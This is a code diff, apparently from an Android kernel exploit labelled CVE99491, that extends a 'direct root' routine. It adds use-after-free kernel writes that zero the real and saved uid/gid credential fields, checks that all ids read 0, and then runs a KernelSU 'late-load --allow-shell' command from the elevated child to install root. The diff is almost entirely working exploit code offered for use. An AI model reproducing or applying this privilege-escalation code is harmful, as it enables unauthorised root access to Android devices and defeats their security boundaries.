@@ -5506,8 +5506,25 @@ static int wait_child_main(void) {
 
             (void)!write(4, &fs, sizeof(fs));
         } else if (c == 'K') {
-            /* Direct engine endgame: exec the in-place late-load in this
-             * already-elevated child (same pid/cred). */
+            /* Direct engine endgame: prefer the app's proven ksud CLI
+             * (`ksud late-load --kmi ... --allow-shell --package-name ...`),
+             * which the 98260 path already uses on this device; fall back
+             * to the in-place libksud.so late-load. */
+            const char *kcli = getenv("CVE99491_KSU_CLI");
+            const char *kmi = getenv("CVE99491_KMI");
+            const char *mgr = getenv("CVE99491_KSU_MANAGER");
+            const char *kbin = (kcli && *kcli) ? kcli : "/data/local/tmp/ksud";
+
+            /* 环境变量是 fork 之后在父进程里 setenv 的，孩子继承不到；
+             * 这里用已知路径兜底，执行 App 98260 路径验证过的同一条命令。 */
+            if (access(kbin, X_OK) == 0) {
+                execl(kbin, "ksud", "late-load",
+                      "--kmi", (kmi && *kmi) ? kmi : "android17-6.18",
+                      "--allow-shell", "--package-name",
+                      (mgr && *mgr) ? mgr : "me.weishu.kernelsu",
+                      (char *)NULL);
+                _exit(5);
+            }
             execl("/proc/self/exe", "exp", "late-load", (char *)NULL);
             _exit(4);
         } else if (c == 'X') {
@@ -7377,12 +7394,36 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
     for (int t = 0; t < 4 && !fsuid_ok; t++) {
         unsigned int fs = ~0u;
 
+        /* real uid/gid 与 suid/sgid 也清零：ksud late-load 与应用侧
+         * `su -c` 都以 real uid 判断，只有 euid=0 不够。 */
+        if (direct_uaf_write(R + 0x08, DIRECT_WORD_ZERO, o->spray_n,
+                             o->spread_ms) < 0)
+            goto fail;
+        writes++;
+        if (direct_uaf_write(R + 0x10, DIRECT_WORD_ZERO, o->spray_n,
+                             o->spread_ms) < 0)
+            goto fail;
+        writes++;
         if (direct_uaf_write(R + 0x20, DIRECT_WORD_ZERO, o->spray_n,
                              o->spread_ms) < 0)
             break;
         writes++;
-        if (direct_child_probe_fsuid(child, go, st, &fs) == 0 && fs == 0)
-            fsuid_ok = 1;
+        {
+            uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };
+            int ids0 = direct_child_probe_ids(child, go, st, ids) == 0;
+
+            if (direct_child_probe_fsuid(child, go, st, &fs) == 0 &&
+                fs == 0 && ids0 && ids[0] == 0 && ids[1] == 0 &&
+                ids[2] == 0 && ids[3] == 0) {
+                fsuid_ok = 1;
+                printf("[*] ids: uid=%u euid=%u gid=%u egid=%u\n",
+                       ids[0], ids[1], ids[2], ids[3]);
+            } else {
+                printf("[*] ids try %d: uid=%u euid=%u gid=%u egid=%u "
+                       "fsuid=%u\n", t + 1, ids[0], ids[1], ids[2], ids[3],
+                       fs);
+            }
+        }
     }
     printf("[%c] fsuid=0\n", fsuid_ok ? '+' : '-');
     if (!fsuid_ok)
@@ -7437,7 +7478,10 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
                "CVE99491_KSU_LIB)\n");
         goto fail;
     }
-    printf("[step] direct root: exec late-load in the elevated child\n");
+    setenv("CVE99491_KSU_CLI", g_ksud_lib, 1);
+    setenv("CVE99491_KMI", g_ksud_kmi, 1);
+    printf("[step] direct root: exec late-load in the elevated child "
+           "(cli=%s kmi=%s)\n", g_ksud_lib, g_ksud_kmi);
     /* The uid-0 child cannot use KSU's sucompat read path; leave the su
      * acceptance to the uid-2000 parent after late-load returns. */
     setenv("CVE99491_SKIP_SU_CHECK", "1", 1);
@@ -7445,13 +7489,13 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
         printf("[-] direct root: could not trigger child late-load\n");
         goto fail;
     }
-    for (int t = 0; t < 200 && !live; t++) {
+    for (int t = 0; t < 600 && !live; t++) {
         live = direct_read_module_live();
         if (!live)
             usleep(50000);
     }
     if (!live) {
-        printf("[-] direct root: kernelsu not Live after 10s\n");
+        printf("[-] direct root: kernelsu not Live after 30s\n");
         goto fail;
     }
     printf("MODULE_LOADED\n");
